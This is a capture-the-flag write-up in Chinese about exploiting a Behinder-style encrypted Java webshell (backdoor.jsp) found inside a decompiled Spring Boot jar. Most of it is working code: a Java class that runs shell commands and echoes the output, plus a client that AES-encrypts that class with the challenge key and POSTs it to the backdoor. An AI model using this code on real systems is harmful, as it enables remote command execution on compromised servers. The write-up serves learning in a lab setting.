---
typora-copy-images-to: ../../../assets
---

# 选择大于努力

## Tag

Java 版一句话木马，冰蝎底层原理，代码审计

## Writeup

反编译 .jar 源码，正常情况下应该会有源码（.jsp 文件）在 `META-INF/resources/` 或者其他目录下，一通乱找找不到，经过 AI 询问后在 `BOOT-INF/lib/views-jar-0.0.1-SNAPSHOT.jar` 里面，再次反编译可以找到 `backdoor.jsp`：

![](../../../assets/PixPin_2025-11-23_09-15-58.png)

AI 说这需要使用冰蝎工具来做，但是用了半天都没用，于是从源码部分找到了其[底层原理](https://xz.aliyun.com/news/2424)，于是编写代码：

```java title="ShellPayload.java"
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

public class ShellPayload {
    @Override
    public boolean equals(Object obj) {
        try {
            // ---------------------------------------------
            // 命令区域：修改这里即可
            String cmd = "cat /flag"; 
            // ---------------------------------------------

            // 1. 执行系统命令
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }
            String output = sb.toString();

            // 2. 利用反射回显结果，替代 page.getResponse().getWriter().write(...)
            // 这样本地编译就不需要 javax.servlet 包了
            
            // 获取 PageContext.getResponse()
            Method getResponseMethod = obj.getClass().getMethod("getResponse");
            Object response = getResponseMethod.invoke(obj);

            // 获取 ServletResponse.getWriter()
            Method getWriterMethod = response.getClass().getMethod("getWriter");
            Object writer = getWriterMethod.invoke(response);

            // 获取 PrintWriter.write(String)
            Method writeMethod = writer.getClass().getMethod("write", String.class);
            writeMethod.invoke(writer, output);

        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
}

```

```java title="Exp.java"
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.util.Base64;

public class Exp {
    // 题目密钥
    private static final String KEY = "e45e329feb5d925b";
    // 题目地址
    private static final String TARGET_URL = "http://127.0.0.1:54649/backdoor";

    public static void main(String[] args) throws Exception {
        File classFile = new File("ShellPayload.class");
        if (!classFile.exists()) {
            System.out.println("错误：找不到 ShellPayload.class 文件！");
            System.out.println("请先执行手动编译命令：");
            System.out.println("javac -source 1.6 -target 1.6 ShellPayload.java");
            return;
        }

        // 读取字节码
        byte[] classBytes = Files.readAllBytes(classFile.toPath());
        
        // AES 加密
        Cipher c = Cipher.getInstance("AES");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(KEY.getBytes(), "AES"));
        byte[] encryptedBytes = c.doFinal(classBytes);

        // Base64 编码 (移除可能产生的换行符)
        String payload = Base64.getEncoder().encodeToString(encryptedBytes).replaceAll("\r|\n", "");

        // 发送
        sendPost(payload);
    }

    public static void sendPost(String data) {
        try {
            URL url = new URL(TARGET_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            
            // 写入数据
            try (OutputStream os = conn.getOutputStream()) {
                os.write(data.getBytes());
                os.flush();
            }

            // 获取响应代码
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String inputLine;
                System.out.println("------- 执行成功，Flag 如下 -------");
                while ((inputLine = in.readLine()) != null) {
                    System.out.println(inputLine);
                }
                in.close();
            } else {
                System.out.println("------- 执行失败 -------");
                System.out.println("HTTP 状态码: " + responseCode);
                // 尝试打印错误信息，看看服务端报什么错
                try (BufferedReader errorReader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {
                    String errorLine;
                    while ((errorLine = errorReader.readLine()) != null) {
                        System.out.println(errorLine);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

运行编译：

```bash
javac -source 1.8 -target 1.8 ShellPayload.java
javac Exp.java
java Exp
```

得到最终 flag：`ZJUCTF{i_don't_know_but_i_have_tools_all_in_one_dbf31aad7e72}`